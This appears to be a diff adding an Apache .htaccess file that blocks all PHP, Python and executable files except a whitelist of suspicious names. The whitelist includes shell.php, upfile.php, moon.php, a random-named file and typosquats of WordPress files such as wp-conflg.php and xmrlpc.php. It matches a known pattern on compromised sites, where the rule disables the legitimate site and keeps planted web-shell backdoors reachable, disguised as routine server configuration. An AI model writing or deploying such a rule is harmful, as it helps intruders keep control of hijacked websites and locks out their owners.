@@ -1,0 +1,8 @@
+<FilesMatch ".(py|exe|phtml|php|PhP|php5|suspected)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "(^wp-login.php|^wp-conflg.php|^class.api.php|^iR7SzrsOUEP.php|^license.php|^wp-blog.php|^moon.php|^upfile.php|^upload.php|^xmrlpc.php|^install.php|^shell.php|^cloud.php|^wp-ldd.php|^wp-good.php|^wp-add.php)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
